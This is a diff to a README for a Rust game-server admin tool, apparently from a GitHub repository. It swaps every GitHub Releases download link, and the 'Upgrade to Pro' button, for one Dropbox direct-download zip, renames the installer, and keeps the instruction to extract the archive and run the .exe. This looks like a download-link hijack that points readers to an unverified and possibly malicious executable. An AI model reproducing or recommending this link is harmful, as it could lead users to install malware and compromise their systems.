@@ -71,7 +71,7 @@
 
 <br/>
 
-**[📥 Download Free](https://github.com/bolod2006/RustAdminServer/releases)**
+**[📥 Download Free](https://www.dropbox.com/scl/fi/g0eemf86mb3k859csjtdx/AdminRS_release.zip?rlkey=s5sezrpa4ul3uyv02jicwzswr&st=lpl7mniq&dl=1)**
 
 </td>
 <td align="center" width="50%">
@@ -102,7 +102,7 @@ Everything in Live, plus:
 
 <br/>
 
-**[⭐ Upgrade to Pro](https://YOUR_WEBSITE.com/pro)**
+**[⭐ Upgrade to Pro](https://www.dropbox.com/scl/fi/g0eemf86mb3k859csjtdx/AdminRS_release.zip?rlkey=s5sezrpa4ul3uyv02jicwzswr&st=lpl7mniq&dl=1)**
 
 </td>
 </tr>
@@ -219,8 +219,8 @@ Everything in Live, plus:
 
 ### Installation
 
-1. Go to **[Releases](https://github.com/bolod2006/RustAdminServer/releases)**
-2. Download `RustAdminServer-v0.2.0.zip`
+1. Go to **[Releases](https://www.dropbox.com/scl/fi/g0eemf86mb3k859csjtdx/AdminRS_release.zip?rlkey=s5sezrpa4ul3uyv02jicwzswr&st=lpl7mniq&dl=1)**
+2. Download `AdminRS.Installer.zip`
 3. Extract to any folder
 4. Run `RustAdminServer.exe`
 5. Go to **Setting → Config** and enter your server details
